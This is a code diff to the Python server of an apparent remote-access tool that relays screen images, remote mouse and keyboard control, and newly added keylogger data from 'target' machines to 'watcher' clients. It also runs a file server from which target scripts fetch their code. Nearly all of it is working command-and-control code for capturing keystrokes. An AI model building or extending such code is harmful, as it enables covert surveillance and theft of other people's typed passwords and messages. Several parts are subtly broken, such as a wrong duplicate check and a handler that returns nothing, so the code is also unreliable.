@@ -1,7 +1,8 @@
 from Base.constants import ImageSendModes, Reasons, Actions, \
-    ClientTypes, ControlDevice, ControlEvents, Status
+    ClientTypes, Status
 from Base.settings import SERVER_PORT, SERVER_ADDRESS, WEB_SERVER_ADDRESS, \
-    WEB_SERVER_PORT, ACKNOWLEDGEMENT_ITERATION, ADDRESS_TYPE, IMAGE_SEND_MODE
+    WEB_SERVER_PORT, ACKNOWLEDGEMENT_ITERATION, ADDRESS_TYPE, \
+    IMAGE_SEND_MODE
 from Base.socket_base import Socket
 import errno
 from http.server import SimpleHTTPRequestHandler
@@ -22,7 +23,7 @@ pil_logger.setLevel(logging.INFO)
 
 class Server(Socket):
     """
-    TODO: use a thread lock while incrementing or decrementing 
+    TODO: use a thread lock while incrementing or decrementing
         the `target.watchers` property
     """
 
@@ -42,6 +43,9 @@ class Server(Socket):
 
         # mapping for target and mouse events
         self.control_events: Dict[str, Queue[bytes]] = {}
+
+        # Target Key Loggers
+        self.target_keyloggers: Dict[str, Socket] = {}
 
         # access codes and sockets of all watchers
         self.watchers: Dict[str, Socket] = {}
@@ -69,7 +73,8 @@ class Server(Socket):
                 return
         self.socket.listen()
         if not self.file_server_running:
-            Thread(target=self.start_file_server, args=("/srv/fileShare",)).start()
+            Thread(target=self.start_file_server, args=("/srv/fileShare",)
+                   ).start()
         self.run()
 
     def run(self):
@@ -81,8 +86,8 @@ class Server(Socket):
                 logging.info("Accepting connection")
                 client_socket, addr = self.socket.accept()
                 logging.info(f"{addr} connected")
-                Thread(target=self.handle_client, 
-                    args=(client_socket,)).start()
+                Thread(target=self.handle_client,
+                       args=(client_socket,)).start()
         except KeyboardInterrupt:
             logging.info("Stopping Server")
             self.stop()
@@ -99,18 +104,22 @@ class Server(Socket):
             return
 
         # get the client type and run the respective function
-        if client_t == b'Hi!':
+        if client_t == ClientTypes.TARGET:
             self.handle_main_target_client(client)
         elif client_t == ClientTypes.TARGET_SCREEN_READER:
             self.handle_target_screen_reader_client(client)
         elif client_t == ClientTypes.TARGET_CONTROLLER:
             self.handle_target_controller_client(client)
+        elif client_t == ClientTypes.TARGET_KEYLOGGER:
+            self.handle_target_keylogger_client(client)
         elif client_t == ClientTypes.WATCHER:
             self.handle_main_watcher_client(client)
         elif client_t == ClientTypes.WATCHER_SCREEN_READER:
             self.handle_watcher_screen_reader_client(client)
         elif client_t == ClientTypes.WATCHER_CONTROLLER:
             self.handle_watcher_controller_client(client)
+        elif client_t == ClientTypes.WATCHER_KEYLOGGER:
+            self.handle_watcher_keylogger_client(client)
         elif client_t == b"":
             logging.info("Client sent no client type.. disconnecting")
             client.socket.close()
@@ -118,15 +127,14 @@ class Server(Socket):
         else:
             raise Exception(f"{client_t} is not a valid client type")
 
-
     def handle_main_target_client(self, client: Socket):
         """
-            The main target client connects, waits for a watcher to start 
+            The main target client connects, waits for a watcher to start
             watching, starts screen reader and controller and disconnects
             itself from the server. The screen reader and controller remain
-            connected untill no. of watchers watching this target client is 
-            at least 1. After no watcher is watching, the screen reader and 
-            controller also disconnect and the main target client connects 
+            connected untill no. of watchers watching this target client is
+            at least 1. After no watcher is watching, the screen reader and
+            controller also disconnect and the main target client connects
             again and waits.
         """
         logging.info("Main Target client connected")
@@ -136,7 +144,7 @@ class Server(Socket):
         if code in self.targets:
             client.send_data(Reasons.ALREADY_CONNECTED)
             logging.info(f"Not allowing target {code} to connect "
-            "as it is already connected")
+                         "as it is already connected")
             client.socket.close()
             return
         client.watchers = 0     # No. of watchers wathing this target
@@ -149,11 +157,13 @@ class Server(Socket):
             while client.status == Status.TARGET_WAITING and self.running:
                 client.send_data(b"WAIT")
                 sleep(1)
-            client.send_data(b"OK")
-            logging.info(f"Main target Client {code} Added")
+            if self.running:
+                client.send_data(b"OK")
+                logging.info(f"Main target Client {code} Added")
         except (ConnectionResetError, BrokenPipeError):
             logging.info(f"Removing main target client {code}")
             del self.targets[code]
+        logging.info(f"Main target client {code} disconnected")
 
     def handle_target_screen_reader_client(self, target: Socket):
         """
@@ -164,7 +174,7 @@ class Server(Socket):
         code = target.recv_data().decode(self.FORMAT)
         if code in self.target_screens:
             logging.info("Not allowing target screen reader {code} "
-                "to connect as it is already connected")
+                         "to connect as it is already connected")
             target.send_data(Reasons.ALREADY_CONNECTED)
             target.socket.close()
             return False
@@ -212,12 +222,13 @@ class Server(Socket):
 
                 target.ready = True
                 i += 1
-                if i==ACKNOWLEDGEMENT_ITERATION:
+                if i == ACKNOWLEDGEMENT_ITERATION:
                     target.send_data(b"OK")
                     i = 0
                 running = self.targets[code].running
 
-            except (BrokenPipeError, ConnectionResetError, KeyError, UnidentifiedImageError): 
+            except (BrokenPipeError, ConnectionResetError, KeyError,
+                    UnidentifiedImageError):
                 # client disconnected
                 logging.info(f"Removing target screen reader client {code}")
                 break
@@ -225,6 +236,7 @@ class Server(Socket):
         target.socket.close()
         del self.target_screens[code]
         self.remove_target(code)
+        logging.info(f"Target screen reader client {code} disconnected")
 
     # fix this: all watchers disconnect when one of them disconnects
     def remove_target(self, code):
@@ -245,10 +257,11 @@ class Server(Socket):
         code = target.recv_data().decode(self.FORMAT)
         if code in self.target_controllers:
             logging.info("Not allowing target controller {code} to "
-                "connect as it is already connected")
+                         "connect as it is already connected")
             target.send_data(Reasons.ALREADY_CONNECTED)
             target.socket.close()
             return False
+        logging.info("Target controller client connected")
         self.target_controllers[code] = target
         self.control_events[code] = Queue(0)
         target.send_data(b"OK")
@@ -264,7 +277,7 @@ class Server(Socket):
                     # target.recv_data()    # reveive 'OK'
             except (BrokenPipeError, ConnectionResetError):
                 logging.info(f"Connection to target controller client {code} "
-                    "failed unexpectedly. Removing it.")
+                             "failed unexpectedly. Removing it.")
                 break
 
             try:
@@ -277,6 +290,46 @@ class Server(Socket):
         del self.target_controllers[code]
         if code in self.targets:
             self.targets[code].running = False
+        logging.info(f"Target controller client {code} disconnected")
+
+    def handle_target_keylogger_client(self, target: Socket):
+        """
+            Get the logged keys from the target. Wait till they are fetched
+            by watcher and then get the next keys.
+        """
+        logging.info(f"Target keylogger client connected")
+        code = target.recv_data().decode(self.FORMAT)
+        if code in self.target_controllers:
+            logging.info("Not allowing target controller {code} to "
+                         "connect as it is already connected")
+            target.send_data(Reasons.ALREADY_CONNECTED)
+            target.socket.close()
+            return False
+        target.ready = False
+        self.target_keyloggers[code] = target
+        target.send_data(b'OK')
+        
+        running = True
+        while running and self.running:
+            try:
+                if target.ready:
+                    continue
+                target.vks = target.recv_data()
+                target.ready = True
+
+            except (BrokenPipeError, ConnectionResetError):
+                logging.info(f"Connection to target keylogger client {code} "
+                             "failed unexpectedly. Removing it.")
+                break
+
+            try:
+                running = self.targets[code].running
+            except KeyError:
+                break
+            sleep(0.1)
+        del self.target_keyloggers[code]
+        logging.info("Target keylogger client {code} disconnected")
+
 
     def handle_main_watcher_client(self, watcher: Socket):
         """
@@ -290,7 +343,7 @@ class Server(Socket):
             code = watcher.recv_data().decode(self.FORMAT)
             if code in self.watchers:
                 logging.info("Not allowing watcher {code} "
-                    "to connect as it is already connected")
+                             "to connect as it is already connected")
                 watcher.send_data(Reasons.ALREADY_CONNECTED)
                 watcher.socket.close()
                 return False
@@ -298,7 +351,7 @@ class Server(Socket):
             self.watchers[code] = watcher
         except (BrokenPipeError, ConnectionResetError):
             logging.info(f"Connection to Main Watcher {code} "
-                "failed unexpectedly. Removing it.")
+                         "failed unexpectedly. Removing it.")
             self.remove_watcher(code)
             return
 
@@ -307,7 +360,7 @@ class Server(Socket):
                 request = watcher.recv_data()
                 if request == Actions.SEND_TARGET_LIST:
                     watcher.send_data(str(list(self.targets.keys()))
-                        .encode(self.FORMAT))
+                                      .encode(self.FORMAT))
                 # elif request == WATCH_BY_CODE:
                 #     target_code = watcher.recv_data().decode(self.FORMAT)
                 #     if not target_code:
@@ -321,13 +374,13 @@ class Server(Socket):
 
                 elif request == Actions.STOP_WATCHING:
                     """
-                        TODO: decrement target.watcher after 
+                        TODO: decrement target.watcher after
                             screen_reader deletes itself
                     """
                     watcher.running = False
 
                     """
-                        sleep for 2 seconds so that screen_reader 
+                        sleep for 2 seconds so that screen_reader
                         and controller disconnect themselves
                     """
                     sleep(2)
@@ -340,13 +393,14 @@ class Server(Socket):
                     raise Exception(f"Request '{request}' not defined!")
             except (BrokenPipeError, ConnectionResetError, OSError):
                 logging.info(f"Connection to Main Watcher {code} "
-                    "closed. Removing it.")
+                             "closed. Removing it.")
                 self.remove_watcher(code)
-                return
+                break
+        logging.info(f"Main watcher client {code} disconnected")
 
     def remove_watcher(self, code: str):
         """
-            After main watcher is removed screen reader 
+            After main watcher is removed screen reader
             and controller automatically remove themselves
         """
         if code in self.watchers:
@@ -354,7 +408,7 @@ class Server(Socket):
 
     def handle_watcher_screen_reader_client(self, watcher: Socket):
         """
-            Screen reader connects to the server and sends 
+            Screen reader connects to the server and sends
             target images to the watcher.
         """
         logging.info(f"Watcher screen reader client connected")
@@ -364,7 +418,7 @@ class Server(Socket):
             watcher.send_data(b"OK")
         except (BrokenPipeError, ConnectionResetError):
             logging.debug("Watcher screen reader disconnected. "
-                "Removing it and stopping watching")
+                          "Removing it and stopping watching")
             return
 
         # get the main target object
@@ -373,7 +427,7 @@ class Server(Socket):
         target.running = True
         target.status = Status.TARGET_RUNNING
 
-        # wair for the target screen to connect
+        # wait for the target screen to connect
         while target_code not in self.target_screens:
             logging.debug("Waiting for target screen to connect")
             sleep(0.1)
@@ -383,7 +437,7 @@ class Server(Socket):
             sleep(0.1)
         running = True
         logging.debug(f"{self.targets[target_code].watchers} "
-            "watchers connected")
+                      "watchers connected")
         self.watchers[code].running = True
         i = 0
         while running and self.running:
@@ -396,13 +450,13 @@ class Server(Socket):
                 target.ready = False
                 watcher.send_data(target_screen.img)
                 i += 1
-                if i==ACKNOWLEDGEMENT_ITERATION:
+                if i == ACKNOWLEDGEMENT_ITERATION:
                     watcher.recv_data()  # receive acknowledgement
                     i = 0
                 sleep(0.01)
             except (BrokenPipeError, ConnectionResetError):
                 logging.debug("Screen reader disconnected. Removing "
-                    "it and stopping watching")
+                              "it and stopping watching")
                 break
             try:
                 running = self.watchers[code].running
@@ -418,7 +472,8 @@ class Server(Socket):
             if (self.targets[target_code].watchers == 0):
                 self.targets[target_code].running = False
                 logging.info(f"Removing target screen reader client {code} "
-                    "as no watcher is watching it.")
+                             "as no watcher is watching it.")
+        logging.info(f"Watcher screen reader client {code} disconnected")
 
     def handle_watcher_controller_client(self, watcher: Socket):
         """
@@ -432,7 +487,7 @@ class Server(Socket):
             watcher.send_data(b"OK")
         except (BrokenPipeError, ConnectionResetError):
             logging.debug("Watcher screen reader disconnected. Removing it "
-                "and stopping watching")
+                          "and stopping watching")
             return
 
         running = True
@@ -447,7 +502,7 @@ class Server(Socket):
                     self.control_events[target_code].put(event)
             except (BrokenPipeError, ConnectionResetError):
                 logging.debug("Controller disconnected. Removing it and "
-                    "stopping watching")
+                              "stopping watching")
                 break
 
             try:
@@ -456,6 +511,56 @@ class Server(Socket):
                 logging.debug("Watcher disconnected. Removing controller")
                 watcher.socket.close()
                 break
+        logging.info(f"Watcher controller client {code} disconnected")
+
+    def handle_watcher_keylogger_client(self, watcher: Socket):
+        """
+        Sends target keystrokes to the watcher
+        """
+
+        logging.info(f"Watcher keylogger client connected")
+        try:
+            code = watcher.recv_data().decode(self.FORMAT)
+            target_code = watcher.recv_data().decode(self.FORMAT)
+            watcher.send_data(b"OK")
+        except (BrokenPipeError, ConnectionResetError):
+            logging.debug("Watcher keylogger disconnected. Removing it "
+                          "and stopping watching")
+            return
+
+        # wait for the target keylogger to connect
+        while target_code not in self.target_keyloggers:
+            logging.debug("Waiting for target keylogger to connect")
+            sleep(0.2)
+        logging.debug("Target keylogger connected")
+        target_keylogger = self.target_keyloggers[target_code]
+
+        running = True
+        while running and self.running:
+            try:
+                if target_code not in self.targets:
+                    watcher.socket.close()
+                    break
+
+                if not target_keylogger.ready:
+                    sleep(0.1)
+                    continue
+
+                vks = target_keylogger.vks
+                target_keylogger.ready = False
+                watcher.send_data(vks)
+            except (BrokenPipeError, ConnectionResetError):
+                logging.debug("Keylogger disconnected. Removing it and "
+                              "stopping watching")
+                break
+
+            try:
+                running = self.watchers[code].running
+            except KeyError:
+                logging.debug("Watcher disconnected. Removing keylogger")
+                watcher.socket.close()
+                break
+        logging.info(f"Watcher keylogger client {code} disconnected")
 
     # def handle_watcher_controllers(self, watcher: Socket, target_code):
     #     """
@@ -476,21 +581,23 @@ class Server(Socket):
             Starts the file server that the target script will
             use to download the main code and the dependencies.
         """
-        Handler = lambda *args, **kwargs: SimpleHTTPRequestHandler(
-            *args, directory=path, **kwargs
-        )
+        def Handler(*args, **kwargs):
+            SimpleHTTPRequestHandler(*args, directory=path, **kwargs)
 
-        with CustomTCPServer((WEB_SERVER_ADDRESS, WEB_SERVER_PORT), Handler) as server:
+        with CustomTCPServer((WEB_SERVER_ADDRESS, WEB_SERVER_PORT),
+                             Handler) as server:
             self.file_server_running = True
             self.file_server = server
             server.allow_reuse_address = True
-            logging.info(f"Starting file server at {WEB_SERVER_ADDRESS}:{WEB_SERVER_PORT}")
+            logging.info(f"Starting file server at {WEB_SERVER_ADDRESS}:"
+                         f"{WEB_SERVER_PORT}")
             server.serve_forever()
         self.file_server_running = False
+        logging.debug("Stopped file server")
 
     def stop(self):
         if self.file_server_running:
-            pass
+            self.file_server.shutdown()
         self.running = False
         self.socket.close()
 
